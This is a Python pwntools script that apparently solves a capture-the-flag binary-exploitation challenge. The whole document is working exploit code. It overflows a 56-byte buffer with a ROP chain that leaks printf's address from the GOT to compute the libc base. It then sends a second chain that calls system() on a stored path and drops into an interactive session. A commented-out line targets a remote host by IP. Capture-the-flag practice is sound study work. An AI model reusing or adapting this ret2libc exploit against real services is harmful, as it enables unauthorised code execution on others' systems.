from pwn import *

DEBUG = True

if DEBUG:
    r = process("./chall")
    gdb.attach(r, api=True)
    printf_off = 0x000000000060770
    onegadget = 0xe3b04
    system_off = 0x000000000050d60

# else:
#     r = remote("34.143.158.202", 4097)
#     printf_off = 0x000000000061c90
#     onegadget = 0xebcf5

ret_gadget = 0x000000000040101a
printf = 0x401100
pop_rdi_ret = 0x0000000000401523
main = 0x0000000000401397
printf_got = 0x403fa8
exit = 0x401170
path = 0x402020

print(r.recvuntil(b">"))
payload = b"a"*56 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(printf_got) + p64(printf) + p64(ret_gadget) + p64(main)
r.sendline(payload)
r.sendline(b"a")

print(r.recvuntil(b"txt\n"))
outp = r.recvuntil(b"*-")
leak = outp[:-2]
l = int.from_bytes(leak, byteorder='little')
base = l - printf_off
print(hex(base))

print(r.recvuntil(b">"))
payload = b"a"*56 + p64(ret_gadget) + p64(pop_rdi_ret) + p64(path) + p64(base+system_off) + p64(ret_gadget) + p64(exit)
r.sendline(payload)
r.sendline(b"a")

r.interactive()